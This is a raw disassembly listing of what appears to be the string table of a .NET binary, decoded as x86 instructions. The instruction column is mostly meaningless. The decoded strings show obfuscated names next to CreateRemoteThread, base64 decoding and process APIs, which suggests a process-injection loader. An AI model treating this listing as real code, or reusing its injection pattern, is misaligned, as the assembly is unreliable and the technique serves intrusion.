10002bce:	7a 36                	jp     0x10002c06
10002bd0:	75 4b                	jne    0x10002c1d
10002bd2:	42                   	inc    %edx
10002bd3:	46                   	inc    %esi
10002bd4:	45                   	inc    %ebp
10002bd5:	00 47 61             	add    %al,0x61(%edi)
10002bd8:	77 76                	ja     0x10002c50
10002bda:	76 74                	jbe    0x10002c50
10002bdc:	6e                   	outsb  %ds:(%esi),(%dx)
10002bdd:	5a                   	pop    %edx
10002bde:	4c                   	dec    %esp
10002bdf:	32 61 38             	xor    0x38(%ecx),%ah
10002be2:	54                   	push   %esp
10002be3:	4a                   	dec    %edx
10002be4:	31 43 67             	xor    %eax,0x67(%ebx)
10002be7:	4a                   	dec    %edx
10002be8:	32 79 5a             	xor    0x5a(%ecx),%bh
10002beb:	62 45 00             	bound  %eax,0x0(%ebp)
10002bee:	4e                   	dec    %esi
10002bef:	61                   	popa
10002bf0:	43                   	inc    %ebx
10002bf1:	6a 53                	push   $0x53
10002bf3:	76 4e                	jbe    0x10002c43
10002bf5:	65 58                	gs pop %eax
10002bf7:	6c                   	insb   (%dx),%es:(%edi)
10002bf8:	48                   	dec    %eax
10002bf9:	6e                   	outsb  %ds:(%esi),(%dx)
10002bfa:	47                   	inc    %edi
10002bfb:	51                   	push   %ecx
10002bfc:	75 45                	jne    0x10002c43
10002bfe:	00 50 6b             	add    %dl,0x6b(%eax)
10002c01:	6e                   	outsb  %ds:(%esi),(%dx)
10002c02:	73 67                	jae    0x10002c6b
10002c04:	42                   	inc    %edx
10002c05:	66 4b                	dec    %bx
10002c07:	66 7a 69             	data16 jp 0x10002c73
10002c0a:	6b 74 32 52 31       	imul   $0x31,0x52(%edx,%esi,1),%esi
10002c0f:	47                   	inc    %edi
10002c10:	4a                   	dec    %edx
10002c11:	39 47 00             	cmp    %eax,0x0(%edi)
10002c14:	4a                   	dec    %edx
10002c15:	65 6f                	outsl  %gs:(%esi),(%dx)
10002c17:	71 45                	jno    0x10002c5e
10002c19:	79 74                	jns    0x10002c8f
10002c1b:	34 37                	xor    $0x37,%al
10002c1d:	46                   	inc    %esi
10002c1e:	64 48                	fs dec %eax
10002c20:	57                   	push   %edi
10002c21:	50                   	push   %eax
10002c22:	48                   	dec    %eax
10002c23:	51                   	push   %ecx
10002c24:	50                   	push   %eax
10002c25:	47                   	inc    %edi
10002c26:	31 76 39             	xor    %esi,0x39(%esi)
10002c29:	49                   	dec    %ecx
10002c2a:	00 4f 58             	add    %cl,0x58(%edi)
10002c2d:	77 50                	ja     0x10002c7f
10002c2f:	6e                   	outsb  %ds:(%esi),(%dx)
10002c30:	4f                   	dec    %edi
10002c31:	4a                   	dec    %edx
10002c32:	35 4f 72 46 52       	xor    $0x5246724f,%eax
10002c37:	4a                   	dec    %edx
10002c38:	49                   	dec    %ecx
10002c39:	00 4b 77             	add    %cl,0x77(%ebx)
10002c3c:	6c                   	insb   (%dx),%es:(%edi)
10002c3d:	64 6c                	fs insb (%dx),%es:(%edi)
10002c3f:	72 4d                	jb     0x10002c8e
10002c41:	4b                   	dec    %ebx
10002c42:	4d                   	dec    %ebp
10002c43:	39 7a 4f             	cmp    %edi,0x4f(%edx)
10002c46:	76 32                	jbe    0x10002c7a
10002c48:	34 75                	xor    $0x75,%al
10002c4a:	4a                   	dec    %edx
10002c4b:	00 48 52             	add    %cl,0x52(%eax)
10002c4e:	4f                   	dec    %edi
10002c4f:	4e                   	dec    %esi
10002c50:	72 74                	jb     0x10002cc6
10002c52:	34 72                	xor    $0x72,%al
10002c54:	50                   	push   %eax
10002c55:	73 35                	jae    0x10002c8c
10002c57:	4c                   	dec    %esp
10002c58:	48                   	dec    %eax
10002c59:	4a                   	dec    %edx
10002c5a:	61                   	popa
10002c5b:	32 62 37             	xor    0x37(%edx),%ah
10002c5e:	4d                   	dec    %ebp
10002c5f:	00 50 52             	add    %dl,0x52(%eax)
10002c62:	4f                   	dec    %edi
10002c63:	43                   	inc    %ebx
10002c64:	45                   	inc    %ebp
10002c65:	53                   	push   %ebx
10002c66:	53                   	push   %ebx
10002c67:	5f                   	pop    %edi
10002c68:	49                   	dec    %ecx
10002c69:	4e                   	dec    %esi
10002c6a:	46                   	inc    %esi
10002c6b:	4f                   	dec    %edi
10002c6c:	52                   	push   %edx
10002c6d:	4d                   	dec    %ebp
10002c6e:	41                   	inc    %ecx
10002c6f:	54                   	push   %esp
10002c70:	49                   	dec    %ecx
10002c71:	4f                   	dec    %edi
10002c72:	4e                   	dec    %esi
10002c73:	00 4b 74             	add    %cl,0x74(%ebx)
10002c76:	43                   	inc    %ebx
10002c77:	70 64                	jo     0x10002cdd
10002c79:	46                   	inc    %esi
10002c7a:	78 5a                	js     0x10002cd6
10002c7c:	36 37                	ss aaa
10002c7e:	5a                   	pop    %edx
10002c7f:	36 79 35             	ss jns 0x10002cb7
10002c82:	58                   	pop    %eax
10002c83:	6d                   	insl   (%dx),%es:(%edi)
10002c84:	79 66                	jns    0x10002cec
10002c86:	54                   	push   %esp
10002c87:	34 4f                	xor    $0x4f,%al
10002c89:	00 53 54             	add    %dl,0x54(%ebx)
10002c8c:	41                   	inc    %ecx
10002c8d:	52                   	push   %edx
10002c8e:	54                   	push   %esp
10002c8f:	55                   	push   %ebp
10002c90:	50                   	push   %eax
10002c91:	49                   	dec    %ecx
10002c92:	4e                   	dec    %esi
10002c93:	46                   	inc    %esi
10002c94:	4f                   	dec    %edi
10002c95:	00 53 79             	add    %dl,0x79(%ebx)
10002c98:	73 74                	jae    0x10002d0e
10002c9a:	65 6d                	gs insl (%dx),%es:(%edi)
10002c9c:	2e 49                	cs dec %ecx
10002c9e:	4f                   	dec    %edi
10002c9f:	00 55 69             	add    %dl,0x69(%ebp)
10002ca2:	63 44 58 70          	arpl   %eax,0x70(%eax,%ebx,2)
10002ca6:	46                   	inc    %esi
10002ca7:	73 78                	jae    0x10002d21
10002ca9:	45                   	inc    %ebp
10002caa:	54                   	push   %esp
10002cab:	39 6f 45             	cmp    %ebp,0x45(%edi)
10002cae:	38 77 4b             	cmp    %dh,0x4b(%edi)
10002cb1:	6b 32 54             	imul   $0x54,(%edx),%esi
10002cb4:	59                   	pop    %ecx
10002cb5:	50                   	push   %eax
10002cb6:	00 55 7a             	add    %dl,0x7a(%ebp)
10002cb9:	5a                   	pop    %edx
10002cba:	65 47                	gs inc %edi
10002cbc:	43                   	inc    %ebx
10002cbd:	6b 5a 4b 44          	imul   $0x44,0x4b(%edx),%ebx
10002cc1:	48                   	dec    %eax
10002cc2:	62 4b 6a             	bound  %ecx,0x6a(%ebx)
10002cc5:	58                   	pop    %eax
10002cc6:	52                   	push   %edx
10002cc7:	32 37                	xor    (%edi),%dh
10002cc9:	61                   	popa
10002cca:	38 32                	cmp    %dh,(%edx)
10002ccc:	6c                   	insb   (%dx),%es:(%edi)
10002ccd:	61                   	popa
10002cce:	51                   	push   %ecx
10002ccf:	00 53 43             	add    %dl,0x43(%ebx)
10002cd2:	57                   	push   %edi
10002cd3:	78 70                	js     0x10002d45
10002cd5:	59                   	pop    %ecx
10002cd6:	62 45 6a             	bound  %eax,0x6a(%ebp)
10002cd9:	59                   	pop    %ecx
10002cda:	31 38                	xor    %edi,(%eax)
10002cdc:	49                   	dec    %ecx
10002cdd:	58                   	pop    %eax
10002cde:	66 75 67             	data16 jne 0x10002d48
10002ce1:	7a 54                	jp     0x10002d37
10002ce3:	00 50 7a             	add    %dl,0x7a(%eax)
10002ce6:	56                   	push   %esi
10002ce7:	6f                   	outsl  %ds:(%esi),(%dx)
10002ce8:	79 70                	jns    0x10002d5a
10002cea:	57                   	push   %edi
10002ceb:	6b 6c 57 6c 32       	imul   $0x32,0x6c(%edi,%edx,2),%ebp
10002cf0:	52                   	push   %edx
10002cf1:	79 62                	jns    0x10002d55
10002cf3:	65 58                	gs pop %eax
10002cf5:	00 64 77 58          	add    %ah,0x58(%edi,%esi,2)
10002cf9:	00 54 47 54          	add    %dl,0x54(%edi,%eax,2)
10002cfd:	7a 4c                	jp     0x10002d4b
10002cff:	66 6e                	data16 outsb %ds:(%esi),(%dx)
10002d01:	69 6f 61 34 38 46 59 	imul   $0x59463834,0x61(%edi),%ebp
10002d08:	00 64 77 59          	add    %ah,0x59(%edi,%esi,2)
10002d0c:	00 63 62             	add    %ah,0x62(%ebx)
10002d0f:	00 6d 73             	add    %ch,0x73(%ebp)
10002d12:	63 6f 72             	arpl   %ebp,0x72(%edi)
10002d15:	6c                   	insb   (%dx),%es:(%edi)
10002d16:	69 62 00 58 48 6f 5a 	imul   $0x5a6f4858,0x0(%edx),%esp
10002d1d:	5a                   	pop    %edx
10002d1e:	4a                   	dec    %edx
10002d1f:	5a                   	pop    %edx
10002d20:	71 34                	jno    0x10002d56
10002d22:	33 50 4a             	xor    0x4a(%eax),%edx
10002d25:	68 42 61 73 76       	push   $0x76736142
10002d2a:	61                   	popa
10002d2b:	4b                   	dec    %ebx
10002d2c:	64 31 32             	xor    %esi,%fs:(%edx)
10002d2f:	71 62                	jno    0x10002d93
10002d31:	00 53 79             	add    %dl,0x79(%ebx)
10002d34:	73 74                	jae    0x10002daa
10002d36:	65 6d                	gs insl (%dx),%es:(%edi)
10002d38:	2e 43                	cs inc %ebx
10002d3a:	6f                   	outsl  %ds:(%esi),(%dx)
10002d3b:	6c                   	insb   (%dx),%es:(%edi)
10002d3c:	6c                   	insb   (%dx),%es:(%edi)
10002d3d:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
10002d42:	6e                   	outsb  %ds:(%esi),(%dx)
10002d43:	73 2e                	jae    0x10002d73
10002d45:	47                   	inc    %edi
10002d46:	65 6e                	outsb  %gs:(%esi),(%dx)
10002d48:	65 72 69             	gs jb  0x10002db4
10002d4b:	63 00                	arpl   %eax,(%eax)
10002d4d:	47                   	inc    %edi
10002d4e:	65 74 50             	gs je  0x10002da1
10002d51:	72 6f                	jb     0x10002dc2
10002d53:	63 65 73             	arpl   %esp,0x73(%ebp)
10002d56:	73 42                	jae    0x10002d9a
10002d58:	79 49                	jns    0x10002da3
10002d5a:	64 00 47 65          	add    %al,%fs:0x65(%edi)
10002d5e:	74 45                	je     0x10002da5
10002d60:	78 69                	js     0x10002dcb
10002d62:	74 43                	je     0x10002da7
10002d64:	6f                   	outsl  %ds:(%esi),(%dx)
10002d65:	64 65 54             	fs gs push %esp
10002d68:	68 72 65 61 64       	push   $0x64616572
10002d6d:	00 43 72             	add    %al,0x72(%ebx)
10002d70:	65 61                	gs popa
10002d72:	74 65                	je     0x10002dd9
10002d74:	52                   	push   %edx
10002d75:	65 6d                	gs insl (%dx),%es:(%edi)
10002d77:	6f                   	outsl  %ds:(%esi),(%dx)
10002d78:	74 65                	je     0x10002ddf
10002d7a:	54                   	push   %esp
10002d7b:	68 72 65 61 64       	push   $0x64616572
10002d80:	00 41 64             	add    %al,0x64(%ecx)
10002d83:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
10002d87:	74 5f                	je     0x10002de8
10002d89:	48                   	dec    %eax
10002d8a:	61                   	popa
10002d8b:	73 45                	jae    0x10002dd2
10002d8d:	78 69                	js     0x10002df8
10002d8f:	74 65                	je     0x10002df6
10002d91:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
10002d95:	70 6c                	jo     0x10002e03
10002d97:	61                   	popa
10002d98:	63 65 00             	arpl   %esp,0x0(%ebp)
10002d9b:	45                   	inc    %ebp
10002d9c:	6e                   	outsb  %ds:(%esi),(%dx)
10002d9d:	75 6d                	jne    0x10002e0c
10002d9f:	65 72 61             	gs jb  0x10002e03
10002da2:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
10002da6:	43                   	inc    %ebx
10002da7:	6c                   	insb   (%dx),%es:(%edi)
10002da8:	6f                   	outsl  %ds:(%esi),(%dx)
10002da9:	73 65                	jae    0x10002e10
10002dab:	48                   	dec    %eax
10002dac:	61                   	popa
10002dad:	6e                   	outsb  %ds:(%esi),(%dx)
10002dae:	64 6c                	fs insb (%dx),%es:(%edi)
10002db0:	65 00 66 69          	add    %ah,%gs:0x69(%esi)
10002db4:	6c                   	insb   (%dx),%es:(%edi)
10002db5:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
10002db9:	6c                   	insb   (%dx),%es:(%edi)
10002dba:	75 65                	jne    0x10002e21
10002dbc:	54                   	push   %esp
10002dbd:	79 70                	jns    0x10002e2f
10002dbf:	65 00 57 68          	add    %dl,%gs:0x68(%edi)
10002dc3:	65 72 65             	gs jb  0x10002e2b
10002dc6:	00 53 79             	add    %dl,0x79(%ebx)
10002dc9:	73 74                	jae    0x10002e3f
10002dcb:	65 6d                	gs insl (%dx),%es:(%edi)
10002dcd:	2e 43                	cs inc %ebx
10002dcf:	6f                   	outsl  %ds:(%esi),(%dx)
10002dd0:	72 65                	jb     0x10002e37
10002dd2:	00 43 6f             	add    %al,0x6f(%ebx)
10002dd5:	6d                   	insl   (%dx),%es:(%edi)
10002dd6:	70 69                	jo     0x10002e41
10002dd8:	6c                   	insb   (%dx),%es:(%edi)
10002dd9:	65 72 47             	gs jb  0x10002e23
10002ddc:	65 6e                	outsb  %gs:(%esi),(%dx)
10002dde:	65 72 61             	gs jb  0x10002e42
10002de1:	74 65                	je     0x10002e48
10002de3:	64 41                	fs inc %ecx
10002de5:	74 74                	je     0x10002e5b
10002de7:	72 69                	jb     0x10002e52
10002de9:	62 75 74             	bound  %esi,0x74(%ebp)
10002dec:	65 00 47 75          	add    %al,%gs:0x75(%edi)
10002df0:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
10002df7:	62 
10002df8:	75 74                	jne    0x10002e6e
10002dfa:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
10002dff:	75 67                	jne    0x10002e68
10002e01:	67 61                	addr16 popa
10002e03:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
10002e07:	74 74                	je     0x10002e7d
10002e09:	72 69                	jb     0x10002e74
10002e0b:	62 75 74             	bound  %esi,0x74(%ebp)
10002e0e:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
10002e12:	6d                   	insl   (%dx),%es:(%edi)
10002e13:	56                   	push   %esi
10002e14:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
10002e1b:	74 74                	je     0x10002e91
10002e1d:	72 69                	jb     0x10002e88
10002e1f:	62 75 74             	bound  %esi,0x74(%ebp)
10002e22:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002e26:	73 65                	jae    0x10002e8d
10002e28:	6d                   	insl   (%dx),%es:(%edi)
10002e29:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
10002e2d:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
10002e34:	72 
10002e35:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
10002e3c:	73 73                	jae    0x10002eb1
10002e3e:	65 6d                	gs insl (%dx),%es:(%edi)
10002e40:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
10002e44:	72 61                	jb     0x10002ea7
10002e46:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
10002e49:	61                   	popa
10002e4a:	72 6b                	jb     0x10002eb7
10002e4c:	41                   	inc    %ecx
10002e4d:	74 74                	je     0x10002ec3
10002e4f:	72 69                	jb     0x10002eba
10002e51:	62 75 74             	bound  %esi,0x74(%ebp)
10002e54:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
10002e59:	67 65 74 46          	addr16 gs je 0x10002ea3
10002e5d:	72 61                	jb     0x10002ec0
10002e5f:	6d                   	insl   (%dx),%es:(%edi)
10002e60:	65 77 6f             	gs ja  0x10002ed2
10002e63:	72 6b                	jb     0x10002ed0
10002e65:	41                   	inc    %ecx
10002e66:	74 74                	je     0x10002edc
10002e68:	72 69                	jb     0x10002ed3
10002e6a:	62 75 74             	bound  %esi,0x74(%ebp)
10002e6d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002e71:	73 65                	jae    0x10002ed8
10002e73:	6d                   	insl   (%dx),%es:(%edi)
10002e74:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
10002e78:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
10002e7f:	69 
10002e80:	6f                   	outsl  %ds:(%esi),(%dx)
10002e81:	6e                   	outsb  %ds:(%esi),(%dx)
10002e82:	41                   	inc    %ecx
10002e83:	74 74                	je     0x10002ef9
10002e85:	72 69                	jb     0x10002ef0
10002e87:	62 75 74             	bound  %esi,0x74(%ebp)
10002e8a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002e8e:	73 65                	jae    0x10002ef5
10002e90:	6d                   	insl   (%dx),%es:(%edi)
10002e91:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002e95:	6f                   	outsl  %ds:(%esi),(%dx)
10002e96:	6e                   	outsb  %ds:(%esi),(%dx)
10002e97:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
10002e9d:	74 69                	je     0x10002f08
10002e9f:	6f                   	outsl  %ds:(%esi),(%dx)
10002ea0:	6e                   	outsb  %ds:(%esi),(%dx)
10002ea1:	41                   	inc    %ecx
10002ea2:	74 74                	je     0x10002f18
10002ea4:	72 69                	jb     0x10002f0f
10002ea6:	62 75 74             	bound  %esi,0x74(%ebp)
10002ea9:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002ead:	73 65                	jae    0x10002f14
10002eaf:	6d                   	insl   (%dx),%es:(%edi)
10002eb0:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
10002eb4:	65 73 63             	gs jae 0x10002f1a
10002eb7:	72 69                	jb     0x10002f22
10002eb9:	70 74                	jo     0x10002f2f
10002ebb:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
10002ec2:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
10002ec9:	6f                   	outsl  %ds:(%esi),(%dx)
10002eca:	6d                   	insl   (%dx),%es:(%edi)
10002ecb:	70 69                	jo     0x10002f36
10002ecd:	6c                   	insb   (%dx),%es:(%edi)
10002ece:	61                   	popa
10002ecf:	74 69                	je     0x10002f3a
10002ed1:	6f                   	outsl  %ds:(%esi),(%dx)
10002ed2:	6e                   	outsb  %ds:(%esi),(%dx)
10002ed3:	52                   	push   %edx
10002ed4:	65 6c                	gs insb (%dx),%es:(%edi)
10002ed6:	61                   	popa
10002ed7:	78 61                	js     0x10002f3a
10002ed9:	74 69                	je     0x10002f44
10002edb:	6f                   	outsl  %ds:(%esi),(%dx)
10002edc:	6e                   	outsb  %ds:(%esi),(%dx)
10002edd:	73 41                	jae    0x10002f20
10002edf:	74 74                	je     0x10002f55
10002ee1:	72 69                	jb     0x10002f4c
10002ee3:	62 75 74             	bound  %esi,0x74(%ebp)
10002ee6:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002eea:	73 65                	jae    0x10002f51
10002eec:	6d                   	insl   (%dx),%es:(%edi)
10002eed:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
10002ef1:	72 6f                	jb     0x10002f62
10002ef3:	64 75 63             	fs jne 0x10002f59
10002ef6:	74 41                	je     0x10002f39
10002ef8:	74 74                	je     0x10002f6e
10002efa:	72 69                	jb     0x10002f65
10002efc:	62 75 74             	bound  %esi,0x74(%ebp)
10002eff:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002f03:	73 65                	jae    0x10002f6a
10002f05:	6d                   	insl   (%dx),%es:(%edi)
10002f06:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002f0a:	6f                   	outsl  %ds:(%esi),(%dx)
10002f0b:	70 79                	jo     0x10002f86
10002f0d:	72 69                	jb     0x10002f78
10002f0f:	67 68 74 41 74 74    	addr16 push $0x74744174
10002f15:	72 69                	jb     0x10002f80
10002f17:	62 75 74             	bound  %esi,0x74(%ebp)
10002f1a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002f1e:	73 65                	jae    0x10002f85
10002f20:	6d                   	insl   (%dx),%es:(%edi)
10002f21:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002f25:	6f                   	outsl  %ds:(%esi),(%dx)
10002f26:	6d                   	insl   (%dx),%es:(%edi)
10002f27:	70 61                	jo     0x10002f8a
10002f29:	6e                   	outsb  %ds:(%esi),(%dx)
10002f2a:	79 41                	jns    0x10002f6d
10002f2c:	74 74                	je     0x10002fa2
10002f2e:	72 69                	jb     0x10002f99
10002f30:	62 75 74             	bound  %esi,0x74(%ebp)
10002f33:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
10002f37:	6e                   	outsb  %ds:(%esi),(%dx)
10002f38:	74 69                	je     0x10002fa3
10002f3a:	6d                   	insl   (%dx),%es:(%edi)
10002f3b:	65 43                	gs inc %ebx
10002f3d:	6f                   	outsl  %ds:(%esi),(%dx)
10002f3e:	6d                   	insl   (%dx),%es:(%edi)
10002f3f:	70 61                	jo     0x10002fa2
10002f41:	74 69                	je     0x10002fac
10002f43:	62 69 6c             	bound  %ebp,0x6c(%ecx)
10002f46:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
10002f4d:	69 
10002f4e:	62 75 74             	bound  %esi,0x74(%ebp)
10002f51:	65 00 52 51          	add    %dl,%gs:0x51(%edx)
10002f55:	71 47                	jno    0x10002f9e
10002f57:	61                   	popa
10002f58:	4e                   	dec    %esi
10002f59:	48                   	dec    %eax
10002f5a:	53                   	push   %ebx
10002f5b:	74 48                	je     0x10002fa5
10002f5d:	61                   	popa
10002f5e:	48                   	dec    %eax
10002f5f:	51                   	push   %ecx
10002f60:	4d                   	dec    %ebp
10002f61:	64 73 6e             	fs jae 0x10002fd2
10002f64:	55                   	push   %ebp
10002f65:	56                   	push   %esi
10002f66:	79 65                	jns    0x10002fcd
10002f68:	00 53 69             	add    %dl,0x69(%ebx)
10002f6b:	7a 65                	jp     0x10002fd2
10002f6d:	4f                   	dec    %edi
10002f6e:	66 00 41 77          	data16 add %al,0x77(%ecx)
10002f72:	53                   	push   %ebx
10002f73:	49                   	dec    %ecx
10002f74:	54                   	push   %esp
10002f75:	65 39 33             	cmp    %esi,%gs:(%ebx)
10002f78:	78 74                	js     0x10002fee
10002f7a:	34 46                	xor    $0x46,%al
10002f7c:	74 66                	je     0x10002fe4
10002f7e:	00 53 71             	add    %dl,0x71(%ebx)
10002f81:	77 42                	ja     0x10002fc5
10002f83:	58                   	pop    %eax
10002f84:	70 49                	jo     0x10002fcf
10002f86:	61                   	popa
10002f87:	4c                   	dec    %esp
10002f88:	63 39                	arpl   %edi,(%ecx)
10002f8a:	48                   	dec    %eax
10002f8b:	61                   	popa
10002f8c:	31 67 00             	xor    %esp,0x0(%edi)
10002f8f:	53                   	push   %ebx
10002f90:	79 73                	jns    0x10003005
10002f92:	74 65                	je     0x10002ff9
10002f94:	6d                   	insl   (%dx),%es:(%edi)
10002f95:	2e 54                	cs push %esp
10002f97:	68 72 65 61 64       	push   $0x64616572
10002f9c:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
10002fa3:	6f                   	outsl  %ds:(%esi),(%dx)
10002fa4:	64 69 6e 67 00 53 79 	imul   $0x73795300,%fs:0x67(%esi),%ebp
10002fab:	73 
10002fac:	74 65                	je     0x10003013
10002fae:	6d                   	insl   (%dx),%es:(%edi)
10002faf:	2e 52                	cs push %edx
10002fb1:	75 6e                	jne    0x10003021
10002fb3:	74 69                	je     0x1000301e
10002fb5:	6d                   	insl   (%dx),%es:(%edi)
10002fb6:	65 2e 56             	gs cs push %esi
10002fb9:	65 72 73             	gs jb  0x1000302f
10002fbc:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
10002fc3:	46                   	inc    %esi
10002fc4:	72 6f                	jb     0x10003035
10002fc6:	6d                   	insl   (%dx),%es:(%edi)
10002fc7:	42                   	inc    %edx
10002fc8:	61                   	popa
10002fc9:	73 65                	jae    0x10003030
10002fcb:	36 34 53             	ss xor $0x53,%al
10002fce:	74 72                	je     0x10003042
10002fd0:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
10002fd7:	53                   	push   %ebx
10002fd8:	74 72                	je     0x1000304c
10002fda:	69 6e 67 00 5a 66 45 	imul   $0x45665a00,0x67(%esi),%ebp
10002fe1:	64 42                	fs inc %edx
10002fe3:	57                   	push   %edi
10002fe4:	36 64 47             	ss fs inc %edi
10002fe7:	70 61                	jo     0x1000304a
10002fe9:	35 36 62 6b 73       	xor    $0x736b6236,%eax
10002fee:	47                   	inc    %edi
10002fef:	51                   	push   %ecx
10002ff0:	75 67                	jne    0x10003059
10002ff2:	00 50 61             	add    %dl,0x61(%eax)
10002ff5:	74 68                	je     0x1000305f
10002ff7:	00 49 4a             	add    %cl,0x4a(%ecx)
10002ffa:	50                   	push   %eax
10002ffb:	6e                   	outsb  %ds:(%esi),(%dx)
10002ffc:	56                   	push   %esi
10002ffd:	70 62                	jo     0x10003061
10002fff:	70 41                	jo     0x10003042
10003001:	71 56                	jno    0x10003059
10003003:	4c                   	dec    %esp
10003004:	7a 50                	jp     0x10003056
10003006:	61                   	popa
10003007:	75 56                	jne    0x1000305f
10003009:	57                   	push   %edi
1000300a:	79 69                	jns    0x10003075
1000300c:	00 46 45             	add    %al,0x45(%esi)
1000300f:	54                   	push   %esp
10003010:	59                   	pop    %ecx
10003011:	4d                   	dec    %ebp
10003012:	74 4f                	je     0x10003063
10003014:	54                   	push   %esp
10003015:	32 47 51             	xor    0x51(%edi),%al
10003018:	63 51 62             	arpl   %edx,0x62(%ecx)
1000301b:	6e                   	outsb  %ds:(%esi),(%dx)
1000301c:	64 4a                	fs dec %edx
1000301e:	6b 6a 4d 55          	imul   $0x55,0x4d(%edx),%ebp
10003022:	57                   	push   %edi
10003023:	77 73                	ja     0x10003098
10003025:	6a 00                	push   $0x0
10003027:	53                   	push   %ebx
10003028:	4d                   	dec    %ebp
10003029:	4b                   	dec    %ebx
1000302a:	51                   	push   %ecx
1000302b:	42                   	inc    %edx
1000302c:	6a 36                	push   $0x36
1000302e:	74 70                	je     0x100030a0
10003030:	51                   	push   %ecx
10003031:	66 50                	push   %ax
10003033:	6f                   	outsl  %ds:(%esi),(%dx)
10003034:	59                   	pop    %ecx
10003035:	4e                   	dec    %esi
10003036:	43                   	inc    %ebx
10003037:	33 6b 43             	xor    0x43(%ebx),%ebp
1000303a:	39 76 6a             	cmp    %esi,0x6a(%esi)
1000303d:	00 5a 48             	add    %bl,0x48(%edx)
10003040:	47                   	inc    %edi
10003041:	4e                   	dec    %esi
10003042:	7a 78                	jp     0x100030bc
10003044:	74 47                	je     0x1000308d
10003046:	48                   	dec    %eax
10003047:	45                   	inc    %ebp
10003048:	66 4e                	dec    %si
1000304a:	44                   	inc    %esp
1000304b:	6c                   	insb   (%dx),%es:(%edi)
1000304c:	00 4d 77             	add    %cl,0x77(%ebp)
1000304f:	51                   	push   %ecx
10003050:	7a 4c                	jp     0x1000309e
10003052:	6c                   	insb   (%dx),%es:(%edi)
10003053:	37                   	aaa
10003054:	56                   	push   %esi
10003055:	52                   	push   %edx
10003056:	51                   	push   %ecx
10003057:	6c                   	insb   (%dx),%es:(%edi)
10003058:	58                   	pop    %eax
10003059:	4b                   	dec    %ebx
1000305a:	6c                   	insb   (%dx),%es:(%edi)
1000305b:	00 4d 61             	add    %cl,0x61(%ebp)
1000305e:	72 73                	jb     0x100030d3
10003060:	68 61 6c 00 6b       	push   $0x6b006c61
10003065:	65 72 6e             	gs jb  0x100030d6
10003068:	65 6c                	gs insb (%dx),%es:(%edi)
1000306a:	33 32                	xor    (%edx),%esi
1000306c:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
1000306f:	6c                   	insb   (%dx),%es:(%edi)
10003070:	00 4f 58             	add    %cl,0x58(%edi)
10003073:	77 50                	ja     0x100030c5
10003075:	6e                   	outsb  %ds:(%esi),(%dx)
10003076:	4f                   	dec    %edi
10003077:	4a                   	dec    %edx
10003078:	35 4f 72 46 52       	xor    $0x5246724f,%eax
1000307d:	4a                   	dec    %edx
1000307e:	49                   	dec    %ecx
1000307f:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
10003082:	6c                   	insb   (%dx),%es:(%edi)
10003083:	00 4b 69             	add    %cl,0x69(%ebx)
10003086:	6c                   	insb   (%dx),%es:(%edi)
10003087:	6c                   	insb   (%dx),%es:(%edi)
10003088:	00 53 79             	add    %dl,0x79(%ebx)
1000308b:	73 74                	jae    0x10003101
1000308d:	65 6d                	gs insl (%dx),%es:(%edi)
1000308f:	00 52 61             	add    %dl,0x61(%edx)
10003092:	6e                   	outsb  %ds:(%esi),(%dx)
10003093:	64 6f                	outsl  %fs:(%esi),(%dx)
10003095:	6d                   	insl   (%dx),%es:(%edi)
10003096:	00 50 44             	add    %dl,0x44(%eax)
10003099:	58                   	pop    %eax
1000309a:	6a 4e                	push   $0x4e
1000309c:	64 4a                	fs dec %edx
1000309e:	4a                   	dec    %edx
1000309f:	68 6c 57 53 71       	push   $0x7153576c
100030a4:	6f                   	outsl  %ds:(%esi),(%dx)
100030a5:	6e                   	outsb  %ds:(%esi),(%dx)
100030a6:	67 61                	addr16 popa
100030a8:	32 6e 00             	xor    0x0(%esi),%ch
100030ab:	47                   	inc    %edi
100030ac:	65 74 46             	gs je  0x100030f5
100030af:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
100030b6:	57 
